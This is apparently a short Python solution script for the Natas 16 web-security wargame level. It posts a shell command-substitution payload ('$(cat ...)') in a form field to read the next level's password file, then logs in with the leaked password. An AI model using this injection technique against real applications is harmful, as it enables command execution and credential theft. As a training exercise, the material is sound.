"""
natas16: shell injection, more filtering
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 16

def solve(url: str, login: LevelLogin) -> Optional[str]:
    payload = f"$(cat {NATAS_DATA['flag_path']}natas{LEVEL})"
    response = requests.post(url, auth=login, data={"needle": payload})

    print(response.text)

    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))